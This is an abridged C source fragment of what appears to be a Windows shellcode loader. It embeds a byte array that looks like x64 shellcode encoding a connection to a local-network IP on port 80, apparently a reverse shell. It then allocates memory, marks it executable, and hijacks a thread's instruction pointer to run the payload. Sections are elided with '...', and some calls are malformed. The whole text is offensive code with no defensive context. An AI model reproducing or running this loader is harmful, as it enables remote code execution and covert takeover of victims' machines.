...
unsigned char buffer[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
...
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x00,0x50,
0xc0,0xa8,0x02,0xa1,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
...
int main() {
    ...
    LPVOID payloadMemory = VirtualAlloc(NULL, sizeof(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memcpy(payloadMemory, buffer, sizeof(buffer));
    DWORD old = 0;
 
    VirtualProtect(payloadMemory, sizeof(buffer), PAGE_EXECUTE_READWRITE,&old);
 
    HANDLE thread = CreateThread(NULL, 0, MyFunc, CREATE_SUSPENDED, 0,NULL);
    if(thread == INVALID_HANDLE_VALUE){
    printf("Error creating handle! Error ID: %d", GetLastError());
    }

    BOOL context = GetThreadContext(thread, &ctx);
    ...
    if (!context) {
        ...
        ctx.Rip = payloadMemory;
        BOOL setContext = SetThreadContext(thread, &ctx);
        ResumeThread(thread);
